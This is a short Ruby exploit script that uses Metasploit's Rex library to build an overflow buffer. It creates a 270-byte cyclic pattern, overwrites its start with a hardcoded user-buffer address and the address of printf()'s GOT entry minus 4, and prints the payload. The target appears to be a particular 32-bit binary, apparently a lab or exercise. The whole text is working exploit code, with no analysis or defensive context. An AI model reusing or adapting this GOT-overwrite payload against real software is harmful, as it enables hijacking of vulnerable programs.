#! /usr/bin/env ruby
$LOAD_PATH << '~/code/msf4/lib'

require 'rex'

buf = Rex::Text.pattern_create(270)
buf[0, 4] = "\x60\xf3\x04\x08"	# user buf
buf[4, 4] = "\x00\xc0\x04\x08"	# GOT entry for printf() - 4

puts buf
